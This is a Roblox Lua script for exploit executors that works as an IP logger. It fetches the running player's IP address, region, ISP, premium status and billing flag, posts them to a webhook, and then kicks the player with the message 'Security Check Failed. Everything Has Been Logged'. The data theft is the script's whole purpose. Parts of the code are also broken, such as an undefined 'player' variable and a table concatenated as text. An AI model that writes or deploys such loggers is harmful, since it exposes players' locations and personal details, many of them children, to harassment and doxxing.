-- [[ Made By "UnknownDev#3979" ]] --

-- List of exploit checks
local exploitCheck = {
    is_sirhurt_closure and "Sirhurt",
    pebc_execute and "ProtoSmasher",
    syn and "Synapse X",
    secure_load and "Sentinel",
    KRNL_LOADED and "Krnl",
    SONA_LOADED and "Sona",
}

local is_executor_closure = is_syn_closure or is_sentinel_closure or is_krnl_closure or is_proto_closure or is_calamari_closure or is_electron_closure or is_elysian_closure
local is_sirhurt_closure = is_synapse_function or is_sirhurt_closure
local exploit_name = is_synapse_function and "Synapse X" or is_sirhurt_closure and "Sirhurt" or "ProtoSmasher"

-- Webhook URL
local Webhook_URL = "YOUR_WEBHOOK_URL_HERE"

-- Get the player's IP address
local ip = game:HttpGet("https://api.ipify.org") -- IP
local data = game:HttpGet("http://ip-api.com/json/" .. tostring(ip)) -- Data
local allInfo = game:GetService("HttpService"):JSONDecode(data) -- Information
local countryCode, region, as = allInfo["countryCode"], allInfo["regionName"], allInfo["as"] -- CountryCode

-- Create the country flag URL
local countryFlagURL = "https://www.countryflags.io/" .. countryCode .. "/flat/64.png"

-- Create an embed for the webhook
local embedData = {
    ["title"] = "__**" .. game.Players.LocalPlayer.Name .. " Has Executed Your Script!**__",
    ["description"] = "Username: " .. game.Players.LocalPlayer.Name .. " Using **" .. exploitCheck .. "**",
    ["type"] = "rich",
    ["color"] = tonumber(0x7269da),
    ["image"] = {
        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
            tostring(game:GetService("Players").LocalPlayer.Name)
    },
    ["fields"] = {
        {
            ["name"] = "IP Address",
            ["value"] = ip,
            ["inline"] = true
        },
        {
            ["name"] = "Location",
            ["value"] = region .. ", " .. countryCode,
            ["inline"] = true
        },
        {
            ["name"] = "ISP",
            ["value"] = as,
            ["inline"] = true
        },
        {
            ["name"] = "Country Flag",
            ["value"] = "[![Flag](" .. countryFlagURL .. ")](" .. countryFlagURL .. ")",
            ["inline"] = true
        },
        {
            ["name"] = "Premium Subscription",
            ["value"] = game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No",
            ["inline"] = true
        },
        {
            ["name"] = "Billing Information",
            ["value"] = game.Players.LocalPlayer.BillingFlag == Enum.BillingFlag.HasBC or "None",
            ["inline"] = true
        }
    }
}

-- Create the data to send in the webhook
local data = {
    ["content"] = "Player Check result for " .. game.Players.LocalPlayer.Name,
    ["embeds"] = { embedData }
}

-- Define headers for the request
local headers = {
    ["content-type"] = "application/json"
}

-- Send the webhook request
local httpService = game:GetService("HttpService")
local request = http_request or request or HttpPost or syn.request -- I Cant Make Fluxus Request
local SetNewData = game:GetService("HttpService"):JSONEncode(data)
    
local DataToRequest = {
    Url = Webhook_URL,
    Body = SetNewData,
    Method = "POST",
    Headers = headers
}

request(DataToRequest)

coroutine.resume(coroutine.create(function()
	while wait(60) do
		local function main()
		if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
			player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
		end
		if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
			player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
		end
	end
		local success, err = pcall(main)
	end
end))
    
-- Kick the player with a message
game.Players.LocalPlayer:Kick("Security Check Failed. Everything Has Been Logged")
